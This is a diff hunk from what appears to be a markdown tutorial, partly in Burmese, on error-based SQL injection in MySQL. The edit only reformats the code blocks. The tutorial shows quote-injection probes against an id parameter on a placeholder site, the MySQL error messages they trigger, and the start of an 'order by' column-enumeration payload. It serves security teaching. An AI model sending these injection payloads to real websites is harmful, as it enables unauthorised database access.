@@ -3,19 +3,19 @@
 This is probably the easiest vulnerability along the SQL Injection attack. An attacker can enumerate and dump the MySQL database by using the SQL error messages to his advantage.
 
 ## Detecting the vulnerability
-```
-https://site.com/index.php?id=1
-```
+
+<code>https://site.com/index.php?id=1</code>
+
 Website load successfully.
 
 အဲ့တာကိုကျွန်တော်တို့ အနောက်ကနေ ' လေးထည့်ပေးလိုက်ရင် အောက်ကပုံစံမျိုး error message ကျလာမှာဖြစ်ပါတယ်။
-```
-https://site.com/index.php?id=1'
-```
+
+<code>https://site.com/index.php?id=1'</code>
+
 Error message show up: <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...</code>
-```
-https://site.com/index.php?id=1\'
-```
+
+<code>https://site.com/index.php?id=1\'</code>
+
 Error message show up: <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...</code>
 
 <code>https://site.com/index.php?id=1 and 0' order by 1--+</code>
